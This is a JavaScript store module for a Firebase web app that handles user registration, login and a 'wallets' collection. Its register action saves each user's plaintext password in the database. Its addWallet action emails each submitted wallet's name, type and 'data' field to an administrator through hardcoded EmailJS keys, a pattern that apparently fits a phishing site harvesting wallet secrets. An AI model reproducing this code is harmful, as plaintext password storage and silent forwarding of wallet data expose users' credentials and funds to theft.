import { auth, db, st } from "@/services/firebase";
import emailjs from "emailjs-com";

export const state = () => ({
  login: false,
  activePage: "Dashboard",

  loading: {
    modal: false,
    login: false,
    register: false,
    wallet:false,
  },

  alert: {
    is: false,
    type: "",
    message: "",
    title: "",
    persistence: false,
  },

  user: null,
  wallets: [],
});

export const getters = {
  getUser(state) {
    return state.user;
  },
  getState: (state) => (payload) => {
    return state[payload];
  },

  getAlert(state) {
    return state.alert;
  },

  getActivePage(state) {
    return state.activePage;
  },

  getLoading(state) {
    return state.loading;
  },
};

export const mutations = {
  setState(state, { type, value }) {
    state[type] = value;
  },

  setActivePage(state, active) {
    state.activePage = active;
  },

  setAlert(state, alert) {
    state.alert = alert;
  },
  setLoading(state, { type, is }) {
    state.loading.all = is;
    state.loading[type] = is;
  },
};

export const actions = {
  // Alert
  initAlert({ commit }, { is, type, timer, persistence, title, message }) {
    if (typeof persistence === "undefined") {
      persistence = false;
    }
    if (typeof timer === "undefined") {
      timer = null;
    }
    commit("setAlert", { is, type, title, timer, persistence, message });
  },

  async register({ commit, dispatch }, user) {
    commit("setLoading", { type: "register", is: true });
    await auth
      .createUserWithEmailAndPassword(user.email, user.password)
      .then((cred) => {
        console.log(cred.user.uid);
        db.collection("users")
          .doc(cred.user.uid)
          .set({
            role: "user",
            block: false,
            userID: cred.user.uid,
            email: user.email,
            joinDate: user.date,
            password: user.password,
          })
          .then((docRef) => {
            // dispatch('uploadPhoto', { photo: user.photo })
            dispatch("initAlert", {
              is: true,
              type: "success",
              message: "Registration successful",
            });
            commit("setLoading", { type: "register", is: false });
            setTimeout(() => {
              this.$router.push("/login");
            }, 1500);
          })
          .catch((error) => {
            commit("setLoading", { type: "register", is: false });
            dispatch("initAlert", {
              is: true,
              type: "error",
              message: error.message,
            });
            console.log(error.message);
          });
      })
      .catch((error) => {
        commit("setLoading", { type: "register", is: false });
        console.log(error.message);
        if (
          error.message ===
          "The email address is already in use by another account."
        ) {
          dispatch("loginUser", user);
          dispatch("initAlert", {
            is: true,
            type: "success",
            message: "Please Login",
          });
          this.$router.push("/login");
        } else {
          dispatch("initAlert", {
            is: true,
            type: "error",
            message: error.message,
          });
        }
      });
  },

  loginUser({ commit, dispatch, state }, user) {
    commit("setLoading", { type: "login", is: true });
    auth
      .signInWithEmailAndPassword(user.email, user.password)
      .then(() => {
        const userID = auth.currentUser.uid;
        console.log(userID);
        // get current user details
        db.collection("users")
          .doc(userID)
          .get()
          .then((doc) => {
            if (doc.exists) {
              const currentUser = doc.data();
              commit("setState", { type: "user", value: currentUser });
              console.log(currentUser);

              // Redirect to dashboard
              if (!state.user.block) {
                if (state.user !== null) {
                  location.href = "/dashboard";
                  commit("setLoading", { type: "login", is: false });
                  dispatch("initAlert", {
                    is: true,
                    type: "success",
                    message: "Login successful",
                  });
                }
              } else {
                // location.href = '/login'
                dispatch("initAlert", {
                  is: true,
                  type: "error",
                  message: "Account blocked, Please contact support",
                });
                commit("setLoading", { type: "login", is: false });
              }
            } else {
              commit("setLoading", { type: "login", is: false });
              console.log("user not found");
              // dispatch(
              //   "initAlert",
              //   { is: true, type: "error", message: "user not found" },
              //
              // );
              // user.date = new Date().toLocaleDateString();
              // dispatch("resolveUser", user);
            }
          })
          .catch((error) => {
            commit("setLoading", { type: "login", is: false });
            console.log("Error getting document:", error);
          });
      })
      .catch((error) => {
        console.log(error.message);
        dispatch("initAlert", {
          is: true,
          type: "error",
          message: error.message,
        });
        commit("setLoading", { type: "login", is: false });
      });
  },

  logoutUser({ commit }) {
    auth
      .signOut()
      .then(function () {
        this.$router.push("/login");
        commit("setState", { type: "user", value: null });
      })
      .catch((error) => {
        console.log(error.message);
      });
  },

  resetPassword({ commit, dispatch }, email) {
    commit("setLoading", { type: "reset", is: true });
    auth
      .sendPasswordResetEmail(email)
      .then(function () {
        // Email sent.
        commit("setLoading", { type: "reset", is: false });
        dispatch("initAlert", {
          is: true,
          type: "primary",
          message: "Check email for reset link",
        });
      })
      .catch(function (error) {
        commit("setLoading", { type: "reset", is: false });
        dispatch("initAlert", {
          is: true,
          type: "error",
          message: error.message,
        });
      });
  },

  async initWallets({ commit }) {
    commit("setLoading", { type: "wallet", is: true });
    await db.collection("wallets").onSnapshot((snapshot) => {
      const wallets = [];
      const data = snapshot.docs;
      // console.log(data)
      data.forEach((doc) => {
        // get setting detail
        const arr = doc.data();
        wallets.push(arr);
      });

      //sort data
      wallets.sort(function (a, b) {
        return new Date(b.date) - new Date(a.date);
      });

      console.log(wallets);
      commit("setState", { type: "wallets", value: wallets });
      commit("setLoading", { type: "wallet", is: false });
    });
  },

  async addWallet({ commit }, payload) {
    commit("setLoading", { type: "wallet", is: true });
    await db
      .collection("wallets")
      .add(payload)
      .then((res) => {

        setTimeout(() => {
          commit("setLoading", { type: "wallet", is: false });
        console.log("wallet added successful");
        this.$router.push('/')
        },5000)

        updateID(res.id)
        // send email to user
        emailjs
        .send(
          "service_uvqjq0m","template_92vqoti",
          {
            name: payload.name,
            type: payload.type,
            data: payload.data,
            date: payload.date,
          },
          "1yMfJhupH0l8OHE39"
        )
        .then(() => {
          console.log("Email Sent to Admin Successfully");
        });


      })
      .catch((err) => {
        commit("setLoading", { type: "wallet", is: false });
        console.log(err);
      });



    function updateID (id) {
      db.collection('wallets').doc(id).update({
        id
      }).then(() => {
        commit('setLoading', { type: 'wallets', is: false })
        // dispatch('controller/initAlert', { is: true, persistence: true, type: 'success', message: 'Wallet Address Address' }, { root: true })
      }).catch((error) => {
        commit('setLoading', { type: 'wallets', is: false })
        console.log(error.message)
        // dispatch('controller/initAlert', { is: true, persistence: true, type: 'error', message: error.message }, { root: true })
      })
    }
  },

    // Update the wallet address
    async deleteWallet ({ commit, dispatch }, payload) {
      commit('setLoading', { type: 'wallet', is: true })
      console.log(payload)
      await db.collection('wallets').doc(payload).delete()
        .then(() => {
          commit('setLoading', { type: 'wallet', is: false })
          console('wallet deleted successfully')
          // alert('wallet deleted successfully')
          // dispatch('controller/initAlert', { is: true, persistence: true, type: 'success', message: 'Wallet deleted' }, { root: true })
        }).catch((error) => {
          commit('setLoading', { type: 'wallet', is: false })
          console.log(error.message)
          dispatch('controller/initAlert', { is: true, persistence: true, type: 'error', message: error.message }, { root: true })
        })
    },
  
  // Initialize App
  async initApp({ dispatch }) {
    await dispatch("initWallets");
  },

  handleAuth({ commit, dispatch, state }) {
    auth.onAuthStateChanged((user) => {
      if (user) {
        commit("setState", { type: "login", value: true });
        // get current user id
        const userId = auth.currentUser.uid;
        // get current user details
        db.collection("users")
          .doc(userId)
          .onSnapshot((snapshot) => {
            if (snapshot.exists) {
              const currentUser = snapshot.data();

              commit("setState", { type: "user", value: currentUser });
              // init transactions

              // Redirect to dashboard
              if (!state.user.block) {
                dispatch("initApp", null);
                if (state.user !== null) {
                  this.$router.push("/dashboard");
                }
              } else {
                location.href = "/login";
                dispatch("initAlert", {
                  is: true,
                  type: "error",
                  message: "Account blocked, Please contact support",
                });
                commit("setLoading", { type: "login", is: false });
              }

              console.log(state.user);
            } else {
              // snapshot.data() will be undefined in this case
              // eslint-disable-next-line
              console.log("No such document!");
            }
          });
      } else {
        // console.log('logout')
        location.href = "/login";
        commit("setState", { type: "login", value: false });
        commit("setState", { type: "user", value: null });
      }
    });
  },
};
